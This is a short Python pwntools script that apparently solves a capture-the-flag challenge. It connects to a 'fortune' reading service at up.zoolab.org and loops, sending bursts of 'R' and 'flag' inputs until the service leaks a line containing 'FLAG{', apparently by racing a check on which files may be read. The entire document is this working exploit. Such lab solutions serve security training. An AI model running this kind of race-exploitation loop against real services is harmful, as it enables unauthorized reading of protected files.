#!/usr/bin/python3

from pwn import *

found = False
n = 1
conn = remote('up.zoolab.org', 10931)
conn.recvuntil(b'type a fortune name to read it.\n')

while not found:
    conn.sendline(b'R\nR\nflag\nR\nflag\nflag')
        
    for i in range(6):
        res = conn.recvline().decode("ascii")
        if 'FLAG{' in res:
            print(res)
            found = True